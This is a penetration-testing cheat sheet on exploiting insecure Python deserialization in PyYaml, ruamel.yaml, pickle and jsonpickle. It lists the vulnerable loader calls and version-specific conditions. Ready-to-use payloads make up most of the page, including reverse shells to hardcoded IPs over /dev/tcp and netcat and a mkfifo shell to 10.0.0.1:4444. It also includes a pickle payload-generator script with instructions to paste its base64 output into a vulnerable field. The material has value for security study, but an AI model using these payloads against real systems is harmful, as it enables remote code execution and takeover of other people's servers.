# Python Deserialization

## Theory

Python's built-in serialization modules, such as pickle and cPickle, PyYaml, are commonly used for serializing and deserializing data. However, if the deserialization process is not properly secured, it can be exploited by attackers to execute arbitrary code or perform other malicious activities.

## Practice

### PyYaml Deserialization

{% tabs %}
{% tab title="Enumerate" %}
Since **PyYaml** version **5.4**, the default loader for `load` has been switched to `SafeLoader` mitigating the risks against Remote Code Execution.&#x20;

The vulnerable sinks are now:

```python
import yaml
from yaml import Loader, UnsafeLoader
data = b'!!python/object/new:os.system ["bash -c \'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1\'"]'

yaml.load(data, Loader=UnsafeLoader)
yaml.load(data, Loader=Loader)
yaml.unsafe_load(data)
```

On PyYaml versions **>= 5.1  (and inferior to 5.4)** we can use following functions

```python
import yaml
from yaml import Loader, UnsafeLoader, FullLoader
data = b'!!python/object/new:os.system ["bash -c \'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1\'"]'

yaml.load(data) #works under certain conditions
yaml.load(data, Loader=Loader)
yaml.load(data, Loader=UnsafeLoader)
yaml.load(data, Loader=FullLoader)
yaml.load_all(data) #works under certain conditions
yaml.load_all(data, Loader=Loader)
yaml.load_all(data, Loader=UnsafeLoader)
yaml.load_all(data, Loader=FullLoader)
yaml.full_load(data)
yaml.full_load_all(data)
yaml.unsafe_load(data)
yaml.unsafe_load_all(data)
```

{% hint style="info" %}
In order for `load()` and `load_all()` to deserialize custom class objects, subprocess have to be imported if we use Popen in our payload. Serialized object of os.system won't works.

You can still use `!!python/object/new:str` payload.
{% endhint %}

On PyYaml versions **inferior to 5.1** we can use following functions

```python
import yaml
from yaml import Loader, UnsafeLoader, FullLoader
data = b'!!python/object/new:os.system ["bash -c \'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1\'"]'

yaml.load(data)
yaml.load(data, Loader=Loader)
yaml.load_all(data)
yaml.load_all(data, Loader=Loader)
```
{% endtab %}

{% tab title="Payloads" %}
If we controll some variables passed to this vulnerables functions, we can inject arbitrary code. here are example of some payloads:

```bash
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]

!!python/object/apply:subprocess.Popen
- ls

!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cmd.exe
  - /c
  - dir
  
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```
{% endtab %}

{% tab title="Tools" %}
The tool [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) can be used to generate payloads. It create **serialized payload** for deserialization RCE attack on python driven applications where pickle ,**pyYAML**, **ruamel.yaml** or **jsonpickle** module is used for deserialization of serialized data.

```bash
python3 peas.py
```
{% endtab %}
{% endtabs %}

## **Ruamel.yaml** Deserialization

{% tabs %}
{% tab title="Enumerate" %}
To deserialize in **ruamel.yaml** , following methods are vulnerable to arbitrary code execution:

```python
import ruamel.yaml
data = b"""!!python/object/apply:subprocess.Popen
- ls"""

ruamel.yaml.load(data)
ruamel.yaml.load(data, Loader=ruamel.yaml.Loader)
ruamel.yaml.load(data, Loader=ruamel.yaml.UnsafeLoader)
ruamel.yaml.load(data, Loader=ruamel.yaml.FullLoader)
ruamel.yaml.load_all(data)
ruamel.yaml.load_all(data, Loader=ruamel.yaml.Loader)
ruamel.yaml.load_all(data, Loader=ruamel.yaml.UnSafeLoader)
ruamel.yaml.load_all(data, Loader=ruamel.yaml.FullLoader)

```
{% endtab %}

{% tab title="Payloads" %}
If we controll some variables passed to a vulnerable functions, we can inject arbitrary code. here are example of some payloads:

```bash
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]

!!python/object/apply:subprocess.Popen
- ls

!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cmd.exe
  - /c
  - dir
  
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```
{% endtab %}

{% tab title="Tools" %}
The tool [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) can be used to generate payloads. It create **serialized payload** for deserialization RCE attack on python driven applications where pickle ,**pyYAML**, **ruamel.yaml** or **jsonpickle** module is used for deserialization of serialized data.

```
python3 peas.py
```
{% endtab %}
{% endtabs %}

## Pickle/cPickle Deserialization

The python `pickle` and `cPickle` (implementation of Pickle in C) modules, that serializes and deserializes a Python object, are vulnerables to remote code execution. If the website uses this modules, we may be able to execute arbitrary code.

{% tabs %}
{% tab title="Enumerate" %}
With **Pickle** deserialization ,the following code is vulnerable to arbitrary code execution using the `pickle.load()` function without proper sanitization of the input.

```python
import pickle
import base64
from flask import Flask, request

@app.route("/hackme", methods=["POST"])
def hackme():
    data = base64.urlsafe_b64decode(request.form['pickled'])
    deserialized = pickle.loads(data)
    # do something with deserialized or just
    # get pwned.

    return '', 204
```
{% endtab %}

{% tab title="Payloads" %}
You may run the below Python script to generate a payload for a reverse shell.

{% code title="gen_payload.py" %}
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

```
{% endcode %}

Run this script to generate the Base64 payload.

```bash
python3 gen_payload.py
```

Now, copy the output base64 string and paste it in the vulnerable input
{% endtab %}

{% tab title="Tools" %}
The tool [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) can be used to generate payloads. It create **serialized payload** for deserialization RCE attack on python driven applications where pickle ,**pyYAML**, **ruamel.yaml** or **jsonpickle** module is used for deserialization of serialized data.

```
python3 peas.py
```
{% endtab %}
{% endtabs %}

## Jsonpickle Deserialization

[Jsonpickle](https://jsonpickle.github.io/) is a python library for serializing any arbitrary object graph into JSON.

{% tabs %}
{% tab title="Enumerate" %}
With **jsonPickle** deserialization ,the following code is vulnerable to arbitrary code execution using the `jsonpickle.decode()` function without proper sanitization of the input.

```python
import jsonpickle
[...]
some_parameter = jsonpickle.decode(malicious)
```
{% endtab %}

{% tab title="Payloads" %}
If we controll some variables passed to the vulnerable function, we can inject arbitrary code. here are example of some payloads:

```bash
#Simple ls
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["ls"]}]}]}

#Reverse Shell
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["/bin/bash", "-i", ">&", "/dev/tcp/10.10.14.7/9001", "0>&1"]}]}]}
```
{% endtab %}

{% tab title="Tools" %}
The tool [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) can be used to generate payloads. It create **serialized payload** for deserialization RCE attack on python driven applications where pickle ,**pyYAML**, **ruamel.yaml** or **jsonpickle** module is used for deserialization of serialized data.

```
python3 peas.py
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/Python/" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization" %}

{% embed url="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/" %}
